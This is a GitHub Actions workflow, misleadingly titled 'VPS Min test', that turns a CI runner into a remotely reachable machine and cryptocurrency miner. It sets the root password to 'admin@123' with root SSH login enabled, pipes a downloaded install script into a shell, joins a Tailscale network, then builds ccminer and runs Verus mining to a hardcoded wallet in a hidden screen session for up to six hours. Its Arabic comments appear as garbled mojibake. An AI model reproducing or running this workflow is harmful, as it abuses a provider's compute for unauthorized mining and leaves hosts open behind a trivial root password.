name: VPS Min test

on:
  workflow_dispatch:

jobs:
  secure-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Install & Configure SSH
        run: |
          sudo apt update -y
          sudo apt install -y openssh-server
          sudo systemctl enable ssh
          sudo systemctl start ssh
          echo "root:admin@123" | sudo chpasswd
          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
          sudo service ssh restart
          echo "âœ… SSH user: root | pass: admin@123"

      - name: Install Tailscale
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}
          tsIP=$(tailscale ip -4 | head -n 1)
          echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
          echo "âœ… Tailscale IP: $tsIP"

      - name: Run Mining Script
        run: |
          # Ø¥Ù†Ø´Ø§Ø¡ Worker Name Ø¹Ø´ÙˆØ§Ø¦ÙŠ
          RAND_NUM=$(shuf -i 1000-9999 -n 1)
          RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
          WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
          echo "ðŸ‘· Worker Name: $WRK"

          # Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªØ¹Ø¯ÙŠÙ†
          WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
          POOL="pool.verus.io:9998"
          TH=8

          # ØªØ«Ø¨ÙŠØª Ø§Ù„Ù…ÙƒØªØ¨Ø§Øª Ø§Ù„Ø¶Ø±ÙˆØ±ÙŠØ©
          sudo apt update -y
          sudo apt install -y git build-essential libcurl4-openssl-dev libssl-dev \
              libjansson-dev automake autotools-dev screen

          # ØªÙ†Ø²ÙŠÙ„ ÙˆØªØ¬Ù‡ÙŠØ² ccminer Ù„Ùˆ Ù…Ø´ Ù…ÙˆØ¬ÙˆØ¯
          if [ ! -d "$HOME/ccminer" ]; then
              git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
              cd ~/ccminer
              ./build.sh
          else
              cd ~/ccminer
              make clean
              ./build.sh
          fi

          # Ø¥Ù†Ø´Ø§Ø¡ config.json
          cat > config.json <<EOF
{
  "pools": [
    { "name": "CUSTOM", "url": "stratum+tcp://${POOL}", "timeout": 180, "disabled": 0 }
  ],
  "user": "${WAL}.${WRK}",
  "pass": "x",
  "algo": "verus",
  "threads": ${TH},
  "api-bind": "127.0.0.1:4068"
}
EOF
          echo "ðŸ“‚ Ù…Ù„Ù config.json Ø§ØªØ¹Ù…Ù„"

          # ØªØ´ØºÙŠÙ„ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† ÙÙŠ screen
          screen -dmS verus_mining ./ccminer -c config.json
          echo "ðŸš€ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† Ø¨Ø¯Ø£ ÙÙŠ Ø¬Ù„Ø³Ø© screen Ø§Ø³Ù…Ù‡Ø§: verus_mining"
          echo "â–¶ï¸ Ù„Ù„Ø±Ø¬ÙˆØ¹ Ù„Ù„Ø¬Ù„Ø³Ø©: screen -r verus_mining"
          echo "ðŸ”š Ù„Ù„Ø®Ø±ÙˆØ¬ Ø¨Ø¯ÙˆÙ† Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ¹Ø¯ÙŠÙ†: Ø§Ø¶ØºØ· Ctrl+A Ø«Ù… D"
